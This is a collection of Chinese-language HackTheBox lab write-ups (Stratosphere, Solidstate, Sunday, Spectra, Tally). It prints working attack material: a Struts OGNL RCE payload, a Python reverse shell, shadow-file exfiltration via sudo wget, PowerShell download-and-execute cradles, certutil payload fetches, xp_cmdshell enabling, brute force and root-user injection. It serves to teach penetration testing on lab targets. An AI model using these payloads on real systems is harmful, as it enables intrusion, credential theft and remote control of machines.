<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>发现了Monitoring目录</p>
<p><img src="/images/Stratosphere/6.png" alt="6"></p>
<p>注意跳转后的url文件为<code>Welcome.action</code>，<code>.action</code>后缀说明使用了<code>java struts</code>框架</p>
<p><code>struts</code>存在是非常老的架构，存在大量的RCE漏洞，以往在现实生活中很常见。搜索后发现</p>
<h2 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h2><p>首先尝试<a href="https://zhuanlan.zhihu.com/p/26219061">CVE-2017-5638</a>，一个由于Ognl表达式注入导致的RCE漏洞</p>
<p>手动确定该漏洞可以对任意页面发起请求，并添加<code>Content-Type字</code>段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: $&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Struts-Exploit-Test&#39;,100*100))&#125;</span><br></pre></td></tr></table></figure>

<p>根据返回头部，确认PoC生效</p>
<p><img src="/images/Stratosphere/7.png" alt="7"></p>
<p>google搜索<code>CVE-2017-5638</code>，发现<a href="https://github.com/mazen160/struts-pwn">EXP</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python struts-pwn.py -u http:&#x2F;&#x2F;10.10.10.64&#x2F;Monitoring&#x2F;example&#x2F;Welcome.action -c id</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stratosphere/8.png" alt="8"></p>
<p>抓取这次请求，发现payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stratosphere/9.png" alt="9"></p>
<h2 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h2><p>和S2-045原理类似，只是漏洞的输入点不同，<a href="https://raw.githubusercontent.com/zhangzhenfeng/AnyScan/master/AnyScanUI/poc/S2-046.py">EXP</a>需要修改URL地址</p>
<p><img src="/images/Stratosphere/10.png" alt="10"></p>
<p>请求包不好复制粘贴，其中有一个空字节\x00</p>
<p><img src="/images/Stratosphere/11.png" alt="11"></p>
<h2 id="Bypass-Firewall"><a href="#Bypass-Firewall" class="headerlink" title="Bypass Firewall"></a>Bypass Firewall</h2>]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Solidstate</title>
    <url>/2020/06/19/HTB-Solidstate/</url>
    <content><![CDATA[<h1 id="solidstate"><a href="#solidstate" class="headerlink" title="solidstate"></a>solidstate</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/solidstate/1.jpg" alt="1"></p>
<p>注意到该机器运行着web服务和apache james</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="查看敏感邮件getshell"><a href="#查看敏感邮件getshell" class="headerlink" title="查看敏感邮件getshell"></a>查看敏感邮件getshell</h3><p>在网上搜索到了james的默认账号密码<code>root/root</code></p>
<p><img src="/images/solidstate/2.jpg" alt="2"></p>
<p>尝试登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 10.10.10.51 4555</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">help					&#x2F;&#x2F;查看可用指令</span><br><span class="line">listusers				&#x2F;&#x2F;列出可用账户</span><br><span class="line">setpassword [username] [password]			&#x2F;&#x2F;修改账户密码</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/3.jpg" alt="3"></p>
<p>利用修改密码修改所有账户的密码</p>
<p><img src="/images/solidstate/4.jpg" alt="4"></p>
<p>接着逐个登录，查看每个人的邮件信息，在mindy用户中发现了ssh登录信息<br>这里用nc没回显，用telnet就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.51 110</span><br><span class="line">USER mindy</span><br><span class="line">PASS toor</span><br><span class="line">list</span><br><span class="line">retr 2</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/5.jpg" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh mindy@10.10.10.51</span><br><span class="line">P@55W0rd1!2@</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/6.jpg" alt="6"></p>
<p>成功获取shell<br>不过</p>
<p><img src="/images/solidstate/8.jpg" alt="8"></p>
<p>是一个受限的shell(rshell)</p>
<h4 id="方法1shell逃逸"><a href="#方法1shell逃逸" class="headerlink" title="方法1shell逃逸"></a>方法1shell逃逸</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/9.jpg" alt="9"></p>
<p>通过这样的方法就可以得到无限制的交互式shell</p>
<h4 id="方法2RCE-getshell"><a href="#方法2RCE-getshell" class="headerlink" title="方法2RCE getshell"></a>方法2RCE getshell</h4><p>寻找公开漏洞</p>
<p><img src="/images/solidstate/7.jpg" alt="7"></p>
<p>发现了RCE漏洞，这个漏洞会在任何账户登陆后执行，所以我们只需要修改想要执行的payload，比如reverse_shell连接</p>
<p><img src="/images/solidstate/10.jpg" alt="10"></p>
<p>执行exploit</p>
<p><img src="/images/solidstate/11.jpg" alt="11"></p>
<p>之后监听端口，只要我们登录ssh，即可获取一个新shell</p>
<p><img src="/images/solidstate/12.jpg" alt="12"></p>
<p>升级为交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/13.jpg" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="cronjobs"><a href="#cronjobs" class="headerlink" title="cronjobs"></a>cronjobs</h3><p>发现拥有写权限的文件</p>
<p><img src="/images/solidstate/14.jpg" alt="14"></p>
<p>发现root执行的计划任务</p>
<p><img src="/images/solidstate/15.jpg" alt="15"></p>
<p>修改文件为reverse_shell即可，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt</span><br><span class="line">echo &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.150&#39;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])&quot; &gt; tmp.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/16.jpg" alt="16"></p>
<p>最后获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Sunday</title>
    <url>/2020/06/25/HTB-Sunday/</url>
    <content><![CDATA[<h1 id="Sunday"><a href="#Sunday" class="headerlink" title="Sunday"></a>Sunday</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Sunday/1.jpg" alt="1"></p>
<p>发现了不常用端口79，finger服务可以查看当前系统用户信息<br>ssh开在了22022</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>使用finger-user-enum进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 10.10.10.76</span><br></pre></td></tr></table></figure>

<p>发现账户sunny和sammy</p>
<p><img src="/images/Sunday/3.jpg" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medusa -f -u sunny -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -M ssh -n 22022 -h 10.10.10.76</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/4.jpg" alt="4"></p>
<p><code>sunny/sunday</code></p>
<p>使用ssh进行连接，需要指定端口22022</p>
<p><img src="/images/Sunday/2.jpg" alt="2"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在根目录发现了backup文件夹</p>
<p><img src="/images/Sunday/5.jpg" alt="5"></p>
<p>发现了sammy的hash，尝试破解<code>$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/6.jpg" alt="6"></p>
<p>成功破解出密码<code>cooldude!</code><br>成功切换账号</p>
<p><img src="/images/Sunday/7.jpg" alt="7"></p>
<p>并且发现，我能够以root运行wget</p>
<p>接收发送的shadow文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget --post-file&#x3D;&#x2F;etc&#x2F;shadow 10.10.16.99:4444</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/8.jpg" alt="8"></p>
<p>修改root密码为我们知道的密码就可以了</p>
<p>覆盖shadow</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget http:&#x2F;&#x2F;10.10.16.99&#x2F;shadow -O shadow</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/9.jpg" alt="9"></p>
<p>另外，wget的i参数可以以某个文件内存放的内容作为参数，如果参数不合法，就会报错，利用这点可以快速读取任意文件</p>
<p><img src="/images/Sunday/10.png" alt="10"></p>
<p>方法2</p>
<p>sunny用户有一个可以以root运行的shell脚本，利用sammy的wget覆盖那个shell脚本，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>

<p>之后sudo运行那个脚本，也可以获得shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Spectra</title>
    <url>/2021/02/28/HTB-Spectra/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>添加host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.129.82.11    spectra.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Spectra/1.png" alt="1"></p>
<p>web目录枚举</p>
<p><img src="/images/Spectra/2.png" alt="2"></p>
<p>发现main是一个wordpress应用，testing疑似测试目录</p>
<p>testing存在目录遍历</p>
<p><img src="/images/Spectra/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>wp-config是wordpress保存数据库连接的文件，里面很轻松的找到了凭据</p>
<p><code>devtest/devteam01</code></p>
<p><img src="/images/Spectra/4.png" alt="4"></p>
<p>现在去main目录尝试登录wordpress，不过出现了错误</p>
<p><img src="/images/Spectra/5.png" alt="5"></p>
<p>考虑了站点情况，我是用wpscan对站点进行了扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token ****** --url http:&#x2F;&#x2F;spectra.htb&#x2F;main&#x2F; --enumerate u </span><br></pre></td></tr></table></figure>

<p>发现了Administrator用户</p>
<p><img src="/images/Spectra/6.png" alt="6"></p>
<p>所以当我尝试<code>Administrator/devteam01</code>，成功登录</p>
<p><img src="/images/Spectra/7.png" alt="7"></p>
<p>wordpress管理员获取shell方法已经做了很多，多种方法可以参考靶场Mr-Robot-1</p>
<p>这里就直接msf了</p>
<p><img src="/images/Spectra/8.png" alt="8"></p>
<p>成功获取shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当我进去之后，还是有点意思，检查了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*-release</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;osrelease</span><br></pre></td></tr></table></figure>

<p>好像是chrome os</p>
<p>有python可以得到pty</p>
<p><img src="/images/Spectra/9.png" alt="9"></p>
<p>不知道为什么，无法运行shell脚本，只能手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh .&#x2F;test.sh</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: Refusing to exec .&#x2F;test.sh from noexec mount; see https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromiumos&#x2F;docs&#x2F;+&#x2F;master&#x2F;security&#x2F;noexec_shell_scripts.md</span><br></pre></td></tr></table></figure>

<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>手动枚举发现了/opt/autologin.conf.orig</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span><br><span class="line"># Use of this source code is governed by a BSD-style license that can be</span><br><span class="line"># found in the LICENSE file.</span><br><span class="line">description   &quot;Automatic login at boot&quot;</span><br><span class="line">author        &quot;chromium-os-dev@chromium.org&quot;</span><br><span class="line"># After boot-complete starts, the login prompt is visible and is accepting</span><br><span class="line"># input.</span><br><span class="line">start on started boot-complete</span><br><span class="line">script</span><br><span class="line">  passwd&#x3D;</span><br><span class="line">  # Read password from file. The file may optionally end with a newline.</span><br><span class="line">  for dir in &#x2F;mnt&#x2F;stateful_partition&#x2F;etc&#x2F;autologin &#x2F;etc&#x2F;autologin; do</span><br><span class="line">    if [ -e &quot;$&#123;dir&#125;&#x2F;passwd&quot; ]; then</span><br><span class="line">      passwd&#x3D;&quot;$(cat &quot;$&#123;dir&#125;&#x2F;passwd&quot;)&quot;</span><br><span class="line">      break</span><br><span class="line">    fi</span><br><span class="line">  done</span><br><span class="line">  if [ -z &quot;$&#123;passwd&#125;&quot; ]; then</span><br><span class="line">    exit 0</span><br><span class="line">  fi</span><br><span class="line">  # Inject keys into the login prompt.</span><br><span class="line">  #</span><br><span class="line">  # For this to work, you must have already created an account on the device.</span><br><span class="line">  # Otherwise, no login prompt appears at boot and the injected keys do the</span><br><span class="line">  # wrong thing.</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;inject-keys.py -s &quot;$&#123;passwd&#125;&quot; -k enter</span><br></pre></td></tr></table></figure>

<p>发现了凭据保存位置/etc/autologin/</p>
<p><img src="/images/Spectra/10.png" alt="10"></p>
<p>所以登录凭据为SummerHereWeCome!!</p>
<p>检查/etc/passwd，发现用户katie</p>
<p><img src="/images/Spectra/11.png" alt="11"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><img src="/images/Spectra/12.png" alt="12"></p>
<p><a href="https://linux.die.net/man/8/initctl">https://linux.die.net/man/8/initctl</a></p>
<p><a href="http://upstart.ubuntu.com/getting-started.html">http://upstart.ubuntu.com/getting-started.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -writable</span><br></pre></td></tr></table></figure>

<p><img src="/images/Spectra/13.png" alt="13"></p>
<p>我用ping命令尝试命令注入是否成功执行，在确认执行之后</p>
<p>我将<code>suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::/root:/bin/bash</code>注入到了/etc/passwd</p>
<p><img src="/images/Spectra/14.png" alt="14"></p>
<p>最后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh suser@spectra.htb</span><br><span class="line">toor</span><br></pre></td></tr></table></figure>

<p><img src="/images/Spectra/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Tally</title>
    <url>/2020/07/02/HTB-Tally/</url>
    <content><![CDATA[<h1 id="Tally"><a href="#Tally" class="headerlink" title="Tally"></a>Tally</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE  SERVICE            VERSION</span><br><span class="line">21&#x2F;tcp    open   ftp                Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80&#x2F;tcp    open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS</span><br><span class="line">| http-ntlm-info: </span><br><span class="line">|   Target_Name: TALLY</span><br><span class="line">|   NetBIOS_Domain_Name: TALLY</span><br><span class="line">|   NetBIOS_Computer_Name: TALLY</span><br><span class="line">|   DNS_Domain_Name: TALLY</span><br><span class="line">|   DNS_Computer_Name: TALLY</span><br><span class="line">|_  Product_Version: 10.0.14393</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">81&#x2F;tcp    open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Bad Request</span><br><span class="line">136&#x2F;tcp   closed profile</span><br><span class="line">139&#x2F;tcp   open   netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open   microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">808&#x2F;tcp   open   ccproxy-http?</span><br><span class="line">1433&#x2F;tcp  open   ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: TALLY</span><br><span class="line">|   NetBIOS_Domain_Name: TALLY</span><br><span class="line">|   NetBIOS_Computer_Name: TALLY</span><br><span class="line">|   DNS_Domain_Name: TALLY</span><br><span class="line">|   DNS_Computer_Name: TALLY</span><br><span class="line">|_  Product_Version: 10.0.14393</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;SSL_Self_Signed_Fallback</span><br><span class="line">| Issuer: commonName&#x3D;SSL_Self_Signed_Fallback</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-07-03T00:46:59</span><br><span class="line">| Not valid after:  2050-07-03T00:46:59</span><br><span class="line">| MD5:   bc59 4f63 ebb7 2337 8f37 c4a7 af5e 9087</span><br><span class="line">|_SHA-1: 2a3d eb53 c19f 556f 7bed 8e3f 13c0 8f2e f3c0 239a</span><br><span class="line">|_ssl-date: 2020-07-03T01:19:55+00:00; -5s from scanner time.</span><br><span class="line">5985&#x2F;tcp  open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">15567&#x2F;tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">| http-ntlm-info: </span><br><span class="line">|   Target_Name: TALLY</span><br><span class="line">|   NetBIOS_Domain_Name: TALLY</span><br><span class="line">|   NetBIOS_Computer_Name: TALLY</span><br><span class="line">|   DNS_Domain_Name: TALLY</span><br><span class="line">|   DNS_Computer_Name: TALLY</span><br><span class="line">|_  Product_Version: 10.0.14393</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">32843&#x2F;tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">32844&#x2F;tcp open   ssl&#x2F;http           Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;SharePoint Services&#x2F;organizationName&#x3D;Microsoft&#x2F;countryName&#x3D;US</span><br><span class="line">| Subject Alternative Name: DNS:localhost, DNS:tally</span><br><span class="line">| Issuer: commonName&#x3D;SharePoint Root Authority&#x2F;organizationName&#x3D;Microsoft&#x2F;countryName&#x3D;US</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2017-09-17T22:51:16</span><br><span class="line">| Not valid after:  9999-01-01T00:00:00</span><br><span class="line">| MD5:   965f 55d6 a0b1 fed5 4ce5 3887 2938 0d53</span><br><span class="line">|_SHA-1: 0f6a 3c08 bee8 b7ad 237e 9759 e91c f683 8f0b 149f</span><br><span class="line">|_ssl-date: 2020-07-03T01:19:55+00:00; -5s from scanner time.</span><br><span class="line">| tls-alpn: </span><br><span class="line">|   h2</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">32846&#x2F;tcp open   storagecraft-image StorageCraft Image Manager</span><br><span class="line">47001&#x2F;tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49665&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49666&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49667&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49668&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49669&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br><span class="line">49670&#x2F;tcp open   msrpc              Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<p>扫描出了大量端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试枚举21，不允许匿名登录<br>尝试枚举smb，也不允许访客登录</p>
<p>用特殊的字典扫描SharePoint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;CMS&#x2F;sharepoint.txt -u http:&#x2F;&#x2F;10.10.10.59&#x2F; -o &#x2F;root&#x2F;Desktop&#x2F;dir.txt</span><br></pre></td></tr></table></figure>

<p>之后会发现url <code>10.10.10.59/_layouts/15/viewlsts.aspx</code><br>并且在documents和site pages里提示</p>
<p><img src="/images/Tally/1.jpg" alt="1"></p>
<p>在documents里发现</p>
<p><img src="/images/Tally/2.jpg" alt="2"></p>
<p>下载下来</p>
<p><img src="/images/Tally/3.jpg" alt="3"></p>
<p>我们成功获取了ftp的密码</p>
<p><img src="/images/Tally/4.jpg" alt="4"></p>
<p>在site pages里发现了ftp用户名</p>
<p>现在得到ftp账户密码 <code>ftp_user/UTDRSCH53c&quot;$6hys</code></p>
<p>直接把ftp里所有文件下载下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror &#39;ftp:&#x2F;&#x2F;ftp_user:UTDRSCH53c&quot;$6hys@10.10.10.59&#39;</span><br></pre></td></tr></table></figure>

<p>下载同时手动找一找，看看能发现什么</p>
<p><img src="/images/Tally/5.jpg" alt="5"></p>
<p>在<code>User/Tim/Files</code>里发现kdbx，下载下来<br>注意，这是一个二进制文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binary</span><br><span class="line">get tim.kdbx</span><br></pre></td></tr></table></figure>

<p>尝试破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keepass2john .&#x2F;tim.kdbx &gt; hash.txt</span><br><span class="line">john --format&#x3D;keepass hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/6.jpg" alt="6"></p>
<p><img src="/images/Tally/7.jpg" alt="7"></p>
<p>成功破解，密钥<code>simplementeyo</code></p>
<p><img src="/images/Tally/8.jpg" alt="8"></p>
<p><img src="/images/Tally/9.jpg" alt="9"></p>
<p>成功发现两个账户和密码</p>
<p><code>Finance/Acc0unting</code><br><code>cisco/cisco123</code></p>
<p>尝试枚举smb</p>
<p><img src="/images/Tally/10.jpg" alt="10"></p>
<p>发现成功登录</p>
<p>直接挂载到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount &#x2F;&#x2F;10.10.10.59&#x2F;ACCT &#x2F;tmp -o username&#x3D;Finance,password&#x3D;Acc0unting</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/11.jpg" alt="11"></p>
<p>发现文件<code>zz_Migration/Binaries/New folder/tester.exe</code><br>查看tester.exe中存在的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings tester.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/12.jpg" alt="12"></p>
<p>成功发现数据库用户和密码<code>sa/GWE3V65#6KFH93@4GWTG2G</code><br>而且对方sql server端口对外开放，可以直接登录</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G</span><br></pre></td></tr></table></figure>

<p>不过对方xp_cmdshell函数没开启，需要手动打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;, &#39;1&#39;</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">EXEC SP_CONFIGURE &#39;xp_cmdshell&#39;, 1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/13.jpg" alt="13"></p>
<p>直接弹个powershell回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xp_cmdshell &quot;Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot;</span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/14.jpg" alt="14"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传输提权脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;winpeas.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/15.jpg" alt="15"></p>
<p>可以使用juicypotato</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;JuicyPotato.exe</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;evil.bat</span><br></pre></td></tr></table></figure>

<p>evil.bat是弹powershell的命令<br>而且我们发现机器是win server 2016，直接去找<a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">CLSID</a></p>
